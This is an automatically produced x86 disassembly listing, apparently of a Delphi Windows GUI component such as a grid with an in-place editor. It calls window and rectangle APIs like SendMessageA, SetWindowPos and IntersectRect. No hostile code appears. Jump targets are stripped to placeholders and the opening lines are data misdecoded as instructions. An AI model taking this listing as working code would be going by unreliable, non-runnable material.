add [ eax + eax * 2 + 0x73840043 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0xb6fc0041 0x45
js r-xdata
mov esi 0xbe640043
inc ebp
add ah dh
adc [ eax ] al
cmp al 0x10
add al 0x41
push edx
outsd
ja r-xdata
add al 0x41
push edx
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
pop eax
adc [ ebx ] eax
loopne r-xdata
jb r-xdata
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
sub_45a8d0
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
mov eax [ esp ]
cmp eax [ esp + 0x8 ]
jge r-xdata
mov eax [ esp ]
mov [ ecx + 0x8 ] eax
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jle r-xdata
mov [ ecx ] eax
mov eax [ esp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ esp + 0x4 ]
cmp eax [ esp + 0xc ]
jge r-xdata
mov [ ecx + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ ecx + 0xc ] eax
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
jle r-xdata
mov [ ecx + 0x4 ] eax
add esp 0x10
pop edi
pop esi
retn
mov [ ecx + 0xc ] eax
sub_45a970
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_45a954
test al al
jne r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_45a954
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov edx [ ebx ]
mov [ esi ] edx
mov edx [ ebx + 0x4 ]
mov [ esi + 0x4 ] edx
xor eax eax
jmp r-xdata
test al al
je r-xdata
sub_45a9bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax edi
call sub_45a970
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45a970
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
lea edx [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
call sub_45a970
pop ecx
test al al
jne r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
jmp r-xdata
sub_45aa34
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax ebx
xor ecx ecx
mov edx 0x40
call sub_402b3c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call UnionRect
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x28 ]
call sub_41245c
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x28 ]
call sub_41245c
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x28 ]
call sub_41245c
lea edx [ ebp - 0x40 ]
mov eax ebx
pop ecx
call sub_45a9bc
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov esi eax
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov esi eax
lea edi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
call sub_41245c
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x10 ]
call sub_41245c
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x18 ]
call sub_41245c
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x10 ]
pop ecx
call sub_45a9bc
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebx + 0x8 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_41245c
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_41245c
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x20 ]
call sub_41245c
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x20 ]
pop ecx
call sub_45a9bc
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebx + 0x1c ] eax
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_41245c
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
call sub_41245c
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x28 ]
call sub_41245c
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x30 ]
pop ecx
call sub_45a9bc
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x34 ] eax
sub_45abc4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45aca3
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45acaa
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403e9c
retn
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov esi [ eax ]
xor esi esi
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x8 ]
call sub_45a8b8
cmp esi [ ebp - 0x4 ]
jge r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
cmp esi 0x7fffffe
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0xc ]
call sub_45a8b8
jmp r-xdata
add edi esi
mov esi edi
test esi esi
jge r-xdata
test esi esi
jle r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x10 ]
call sub_45a8b8
mov edx esi
shl edx 0x2
mov eax ebx
call sub_4026fc
cmp [ ebx ] 0x0
je r-xdata
inc esi
mov eax [ ebp - 0x4 ]
inc eax
cmp esi eax
jle r-xdata
dec esi
mov eax [ ebx ]
mov [ eax ] esi
mov edx [ ebx ]
mov ecx [ ebp + 0x8 ]
mov [ edx + eax * 4 ] ecx
inc eax
cmp esi eax
jg r-xdata
sub_45acb4
push ebx
push esi
xor esi esi
cmp [ eax ] 0x0
je r-xdata
push ecx
mov ecx edx
sub ecx esi
mov edx esi
call sub_45abc4
pop esi
pop ebx
retn
mov ebx [ eax ]
mov esi [ ebx ]
sub_45acd0
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebx eax
cmp [ ebx ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
mov edi [ eax + edx * 4 ]
cmp esi edx
jle r-xdata
cmp esi edx
jge r-xdata
mov eax esi
sub eax edx
mov ecx eax
shl ecx 0x2
mov eax [ ebx ]
lea eax [ eax + edx * 4 + 0x4 ]
mov ebp [ ebx ]
lea edx [ ebp + edx * 4 ]
call sub_4028b8
jmp r-xdata
mov eax [ ebx ]
mov [ eax + esi * 4 ] edi
mov eax [ ebx ]
lea eax [ eax + esi * 4 ]
mov ecx [ ebx ]
lea ecx [ ecx + esi * 4 + 0x4 ]
sub edx esi
shl edx 0x2
xchg edx ecx
call sub_4028b8
sub_45ad28
push ebx
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
test edi edi
sete dl
test edi edi
je r-xdata
mov eax edx
pop edi
pop esi
pop ebx
retn
mov esi [ eax ]
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
mov ebx [ eax + ecx * 4 ]
cmp ebx [ edi + ecx * 4 ]
jne r-xdata
sub_45ad64
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4575f8
xor edx edx
mov eax esi
call sub_43b500
xor edx edx
mov eax esi
call sub_43b4d0
xor edx edx
mov eax esi
call sub_43b5c4
xor edx edx
mov eax esi
call sub_42df44
mov [ esi + 0x1f8 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_45ade0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x240 ]
test [ eax + 0x249 ] 0x8
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x2
sub_45ae08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_457aec
sub_45ae28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45ae48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_457ab8
sub_45ae7c
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] dl
lea edx [ ebp - 0x9 ]
push edx
mov dl [ ebp - 0x1 ]
mov eax [ eax + 0x240 ]
mov si 0xffe2
call sub_403324
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_45aec4
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0x9 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffbc
call sub_403324
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
pop esi
pop ebp
retn
sub_45aef8
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x240 ]
mov edx [ eax + 0x1d8 ]
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x1dc ]
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov dl [ edx - 0x9 ]
push edx
mov edx [ ebp + 0x8 ]
mov ecx [ edx - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
sub_45af6c
push ebp
mov ebp esp
push ebx
mov ebx eax
lea eax [ ebx + 0x4 ]
push eax
push ebx
push 0xb0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43b390
push eax
call SendMessageA
pop ebx
pop ebp
retn
sub_45af90
push ebp
mov ebp esp
add esp 0xfffffff8
lea eax [ ebp - 0x8 ]
push eax
call GetCaretPos
mov dx [ ebp - 0x4 ]
mov ax [ ebp - 0x8 ]
call sub_406814
push eax
push 0x0
push 0xd7
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43b390
push eax
call SendMessageA
pop ecx
pop ecx
pop ebp
retn
sub_45afcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_45af6c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4578d0
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
call sub_45af90
pop ecx
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4578d0
cmp eax [ ebp - 0x4 ]
je r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov al 0x1
sub_45b024
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_45af6c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_45af90
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4578d0
cmp ebx eax
je r-xdata
sub_45b070
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp eax 0x26
jg r-xdata
cmp eax 0x2d
jg r-xdata
je r-xdata
sub eax 0x2e
je r-xdata
je r-xdata
push ebp
call sub_45aec4
pop ecx
jmp r-xdata
cmp eax 0x23
jg r-xdata
push ebp
call sub_45af5c
pop ecx
test al al
je r-xdata
sub eax 0x43
je r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
sub eax 0x27
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x24
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_403324
test al al
jne r-xdata
push ebp
call sub_45aec4
pop ecx
jmp r-xdata
push ebp
call sub_45aef8
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x71
jne r-xdata
jmp r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
push ebp
call sub_45aec4
pop ecx
jmp r-xdata
push ebp
call sub_45af40
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebp
call sub_45aef8
pop ecx
mov edx [ ebp - 0x8 ]
mov cl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
call sub_45764c
push ebp
call sub_45af40
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
push ebp
call sub_45af40
pop ecx
test al al
je r-xdata
sub eax 0x9
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
call sub_45b41c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_403324
test al al
jne r-xdata
push ebp
call sub_45af5c
pop ecx
test al al
jne r-xdata
jmp r-xdata
push ebp
call sub_45af5c
pop ecx
test al al
jne r-xdata
push ebp
call sub_45af40
pop ecx
test al al
je r-xdata
jmp r-xdata
push ebp
call sub_45af5c
pop ecx
test al al
jne r-xdata
test [ ebp - 0x9 ] 0x2
jne r-xdata
sub eax 0x12
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
push ebp
call sub_45aec4
pop ecx
jmp r-xdata
push ebp
call sub_45afcc
pop ecx
test al al
je r-xdata
push ebp
call sub_45aec4
pop ecx
jmp r-xdata
push ebp
call sub_45b024
pop ecx
test al al
je r-xdata
push ebp
call sub_45af5c
pop ecx
test al al
jne r-xdata
push ebp
call sub_45aec4
pop ecx
jmp r-xdata
push ebp
call sub_45afcc
pop ecx
test al al
je r-xdata
push ebp
call sub_45aec4
pop ecx
jmp r-xdata
add eax 0xfffffffa
sub eax 0x2
jb r-xdata
push ebp
call sub_45aec4
pop ecx
jmp r-xdata
push ebp
call sub_45b024
pop ecx
test al al
je r-xdata
jmp r-xdata
sub_45b29d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov edx ebx
mov eax [ edi + 0x240 ]
mov si 0xffba
call sub_403324
mov al [ ebx ]
add al 0xe0
sub al 0xe0
jae r-xdata
xor eax eax
mov al [ ebx ]
cmp eax 0x16
jg r-xdata
mov dl [ ebx ]
mov eax [ edi + 0x240 ]
mov si 0xffb2
call sub_403324
test al al
jne r-xdata
sub eax 0x18
je r-xdata
je r-xdata
mov [ ebx ] 0x0
push 0x0
call MessageBeep
mov eax [ edi + 0x240 ]
mov si 0xffb0
call sub_403324
test al al
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x8
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov [ ebx ] 0x0
mov [ ebx ] 0x0
jmp r-xdata
add eax 0xfffffffb
sub eax 0xe0
jb r-xdata
dec eax
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
call sub_45777c
jmp r-xdata
sub eax 0x4
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax edi
call sub_43b390
push eax
call SendMessageA
cmp [ esp ] 0x0
jne r-xdata
jmp r-xdata
mov eax edi
call sub_42e154
mov eax edi
call sub_4578d0
cmp eax [ esp + 0x4 ]
jne r-xdata
mov eax edi
call sub_45b41c
jmp r-xdata
mov [ ebx ] 0x0
jmp r-xdata
sub_45b3a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ esi ]
sub eax 0x7
je r-xdata
mov eax ebx
call sub_44c6fc
test eax eax
je r-xdata
sub eax 0x1fa
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
mov eax ebx
call sub_44c6fc
mov edx [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
call GetMessageTime
mov edi eax
sub edi [ ebx + 0x244 ]
call GetDoubleClickTime
cmp edi eax
jae r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x244 ] eax
mov [ esi ] 0x203
mov edx esi
mov eax ebx
call sub_438da4
sub_45b43c
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
mov eax ebx
call sub_43b390
push eax
call ValidateRect
push 0xffffffff
push 0x0
mov eax ebx
call sub_43b390
push eax
call InvalidateRect
push esp
mov eax ebx
call sub_43b390
push eax
call GetClientRect
push 0x2
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
call sub_43b390
push eax
mov eax ebx
call sub_43b390
push eax
call MapWindowPoints
push esp
mov eax [ ebx + 0x240 ]
call sub_43b390
push eax
call ValidateRect
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
call sub_43b390
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_45b4c0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43b694
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43b390
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_45b43c
push 0x8c
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43b390
push eax
call SetWindowPos
mov eax ebx
mov si 0xffb5
call sub_403324
test al al
je r-xdata
mov eax [ ebx + 0x240 ]
call sub_43b390
push eax
call SetFocus
sub_45b528
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
push esi
call IsRectEmpty
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x94 ]
test bl bl
jne r-xdata
mov eax edi
call sub_45b4c0
jmp r-xdata
mov al 0x1
mov eax edi
call sub_43b390
push eax
call IsWindowVisible
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x240 ]
mov si 0xffb5
call sub_403324
test al al
je r-xdata
mov eax edi
call sub_45b43c
xor eax eax
jmp r-xdata
mov eax edi
call sub_43b390
push eax
call SetFocus
mov ebx eax
mov eax edi
call sub_45b43c
push 0x48
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
mov ebp [ esi ]
sub eax ebp
push eax
mov eax [ esi + 0x4 ]
push eax
push ebp
push 0x0
mov eax edi
call sub_43b390
push eax
call SetWindowPos
mov eax edi
mov edx [ eax ]
call [ edx + 0xfc ]
test bl bl
je r-xdata
sub_45b5d8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
sub ecx 0x2
mov edx 0x2
mov eax 0x2
call sub_412484
mov eax esp
push eax
push 0x0
push 0xb4
mov eax ebx
call sub_43b390
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_43b390
push eax
call SendMessageA
add esp 0x10
pop ebx
retn
sub_45b640
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_45b6ec
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_4579b4
lea eax [ ebp - 0x4 ]
push eax
mov edi [ ebx + 0x240 ]
mov ecx [ edi + 0x22c ]
mov edx [ edi + 0x228 ]
mov eax edi
mov si 0xffac
call sub_403324
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_457ca8
lea eax [ ebp - 0x8 ]
push eax
mov edi [ ebx + 0x240 ]
mov ecx [ edi + 0x22c ]
mov edx [ edi + 0x228 ]
mov eax edi
mov si 0xffaf
call sub_403324
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4579b4
mov eax [ ebx + 0x240 ]
mov si 0xffad
call sub_403324
mov edx eax
mov eax ebx
call sub_457d7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b6f3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
sub_45b6fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43d014
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
mov [ ebx + 0x219 ] 0x1
mov [ ebx + 0x21c ] 0x5
mov [ ebx + 0x24c ] 0x5
mov [ ebx + 0x238 ] 0x1
mov [ ebx + 0x23c ] 0x1
mov [ ebx + 0x244 ] 0x1
mov ax [ r-xdata ]
mov [ ebx + 0x248 ] ax
mov ax [ r-xdata ]
mov [ ebx + 0x290 ] ax
mov [ ebx + 0x240 ] 0xff00000f
mov [ ebx + 0x254 ] 0x3
mov [ ebx + 0x218 ] 0x1
mov [ ebx + 0x230 ] 0x40
mov [ ebx + 0x234 ] 0x18
mov [ ebx + 0x28c ] 0x1
mov [ ebx + 0x28f ] 0x1
mov [ ebx + 0x28d ] 0x0
mov edx 0xff000005
mov eax ebx
call sub_434d54
xor edx edx
mov eax ebx
call sub_434d78
mov dl 0x1
mov eax ebx
call sub_43b5c4
mov eax [ ebx + 0x21c ]
imul [ ebx + 0x230 ]
push eax
mov eax [ ebx + 0x24c ]
imul [ ebx + 0x234 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax ebx
call sub_45dc60
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_45b84a
add [ eax ] al
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x27c ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43d070
mov eax [ esi + 0x220 ]
call sub_4026dc
mov eax [ esi + 0x250 ]
call sub_4026dc
mov eax [ esi + 0x224 ]
call sub_4026dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_45b8a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45b9ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0xc ]
add eax [ edx - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax - 0x4 ] 0x0
jge r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405978
mov eax [ ebp - 0x10 ]
call sub_45a8b8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
imul esi
mov [ ebp - 0x8 ] eax
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edx [ ebp + 0xc ]
cmp eax [ edx - 0x8 ]
jl r-xdata
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0xc ]
mov edx [ eax - 0x8 ]
mov eax ebx
call sub_45abc4
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0xc ]
sub eax [ ecx - 0x4 ]
dec eax
sub eax edx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b9b3
lea eax [ ebp - 0x10 ]
call sub_403e78
retn
mov eax [ ebp + 0xc ]
cmp [ eax - 0x4 ] 0x0
jge r-xdata
cmp [ ebx ] 0x0
je r-xdata
inc eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0xc ]
sub eax [ edx - 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov ecx [ ebx ]
mov ecx [ ecx + edx * 4 ]
add [ ebp - 0x8 ] ecx
inc edx
dec eax
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
sub_45b9c0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
